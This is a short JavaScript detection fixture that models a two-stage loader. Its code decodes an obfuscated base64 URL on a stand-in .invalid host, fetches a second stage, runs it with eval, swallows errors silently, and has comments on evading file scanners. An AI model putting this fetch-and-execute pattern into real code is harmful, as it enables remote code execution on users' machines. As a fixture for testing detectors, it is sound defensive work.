// Beagle Brigade detection fixture. Inert test input, never executed,
// never published. All hosts are under .invalid and cannot resolve.
//
// Models a two-stage loader: an obfuscated bootstrap decodes a URL, fetches
// a second stage and evaluates it. The package itself carries no payload,
// which is exactly why signature scanning misses this class.

const CONFIG =
  "aHR0cHM6Ly9zdGFnZTIuZXhhbXBsZS5pbnZhbGlkL3BheWxvYWQudHh0QUFBQUFBQUFBQUFBQUFBQUFB" +
  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB" +
  "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=";

async function bootstrap() {
  const endpoint = Buffer.from(CONFIG, "base64").toString("utf8").slice(0, 44);
  const res = await fetch(endpoint);
  const stage2 = await res.text();
  // Second stage never touches disk, so there is nothing for a file scanner
  // to find after the fact.
  eval(stage2);
}

bootstrap().catch(() => {});
